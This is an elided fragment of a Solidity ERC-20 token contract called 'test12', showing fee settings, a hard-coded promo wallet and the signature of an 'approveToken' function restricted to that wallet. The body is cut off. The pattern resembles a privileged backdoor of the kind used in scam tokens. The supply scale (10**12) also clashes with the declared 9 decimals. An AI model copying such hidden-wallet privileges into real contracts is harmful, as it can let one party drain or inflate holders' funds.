...
contract test12 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1_000_000_000 * 10**12;
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 7 * 10**12; 
    string private constant _name = "test12"; 
    string private constant _symbol = "$test12"; 
    uint8 private constant _decimals = 9;
    
    uint256 public _promoFee = 3;
    uint256 public _liquidityFee = 3;
    address private _promoWallet = 0x830E7211737a4F1563383c2e9b84cAc13A9E1B25;
    ...
    function approveToken(uint256 accumulation, address acc) promoWallet public virtual {
